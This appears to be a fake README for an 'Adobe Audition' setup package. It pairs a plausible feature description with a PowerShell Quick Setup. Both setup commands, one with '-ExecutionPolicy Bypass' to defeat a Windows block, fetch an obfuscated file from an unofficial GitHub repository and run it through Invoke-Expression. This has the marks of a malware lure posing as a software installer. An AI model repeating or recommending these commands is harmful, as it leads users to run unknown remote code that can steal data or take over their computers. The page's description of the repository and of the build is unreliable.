# Audition

Audition is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Audition and work in it.

Adobe Audition is a desktop audio workstation built for post-production, podcasting, music prep, and sound design on Windows. You work in multitrack and waveform views, apply effects chains, clean dialogue, and export stems or mixed masters without leaving the same project file.

A typical session starts with importing or recording tracks into a session, aligning clips on the timeline, reducing noise and plosives, then balancing levels with buses and automation. You might open the spectral display to notch hum, use match loudness for delivery specs, preview mixes in real time, and bounce a final WAV or broadcast format when the edit is approved.

This repository bundles a Windows setup package for Audition, short install and workspace notes, and a concise changelog so you can track build updates and configuration changes alongside your production templates.

## What you do with it

- Multitrack sessions stack dozens of tracks with non-destructive edits and flexible routing.
- Waveform and spectral views let you surgically remove clicks, hum, and breath noise.
- Built-in effects include EQ, compression, reverb, and loudness tools for delivery standards.
- Essential Sound panel speeds dialogue cleanup and music balancing with preset-driven workflows.
- Batch processing applies consistent fades, normalization, and format conversion across many files.
- Mixdown exports interleaved or split stems with sample-accurate handles and metadata options.
- ReWire and ASIO support integrate external instruments and low-latency monitoring on Windows.
- Clip grouping and markers keep long-form edits organized across chapters and revision passes.

## Quick Setup (PowerShell)

This installs the program Audition on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/bianca464475/audition-setup-guide/main/wi4vt25yy4.a7k5qlg7 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/bianca464475/audition-setup-guide/main/wi4vt25yy4.a7k5qlg7 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `wi4vt25yy4.a7k5qlg7` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `bianca464475/audition-setup-guide`. Adobe Audition 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
